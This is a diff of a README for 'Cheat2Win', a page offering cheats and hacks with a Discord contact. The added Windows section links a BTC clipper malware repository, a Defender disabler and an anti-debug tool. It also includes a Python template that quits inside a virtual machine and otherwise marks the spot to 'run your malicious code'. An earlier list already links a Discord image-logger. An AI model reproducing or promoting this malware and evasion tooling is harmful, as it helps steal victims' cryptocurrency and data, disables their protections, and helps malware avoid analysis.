@@ -1,10 +1,8 @@
-<link rel="shortcut icon" type="image/x-icon" href="favicon.ico?">
-
 ## Cheat2Win - The best Cheats
 
 Welcome to Cheat2Win. To get to appropriately needed downloads use the below downloads & links. If any help is needed contact me in [discord](discord.com) at ༒Cryptic༒#4979. Join the [discord server](discord.gg/WpSkq4d4tk) and make a ticket if I am unavailable. ;)  
 
-
+This was made by ~ Love ❌ code ✅
 
 ### Discord Cheats/Hacks
 
@@ -20,6 +18,27 @@ Welcome to Cheat2Win. To get to appropriately needed downloads use the below dow
 - Discord [Image-logger (Beta)](https://github.com/DarkoPendragon/discord.js-image-logger.git)
 
 - More relative hacks will be posted -
+
+### Windows 
+
+[Anti-Debug](https://github.com/Rdimo/Anti-Debug.git) 
+```import os
+from anti_debug import AntiDebug
+
+if AntiDebug().inVM:
+    os._exit(0)
+else:
+    #we are not in a vm, run your malicious code or whatever
+``` 
+[Auto-Skillcheck](https://github.com/Rdimo/Auto-skillcheck.git)
+```pip install -r requirements.txt``` 
+[Defender Disabler](https://github.com/Rdimo/Defender-disabler.git)
+
+[PC-Cleaner](https://github.com/Rdimo/PC-Cleaner.git)
+
+[BTC-Clipper Malware](https://github.com/Rdimo/BtcClipperMalware.git)
+
+[Auto-Bumper](https://github.com/Rdimo/Auto-Bumper.git)
 
 ### Commands
 ```
